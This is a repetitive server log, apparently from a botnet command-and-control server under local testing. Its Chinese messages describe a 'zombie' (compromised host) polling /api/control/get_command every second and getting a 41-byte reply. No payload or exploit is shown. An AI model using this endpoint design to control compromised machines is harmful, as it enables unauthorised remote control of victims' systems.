2025-06-25 00:11:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:42 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:47 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:48 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:49 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:51 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:52 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:53 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:54 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:55 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:56 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:57 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:58 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:59 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:00 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:01 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:02 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:03 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:04 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:05 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:06 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:07 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:08 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:09 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:10 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:11 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:12 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:13 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:14 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:15 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:16 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:17 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:18 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:19 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:23 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:29 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:12:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:12:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:12:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:12:30 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:12:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
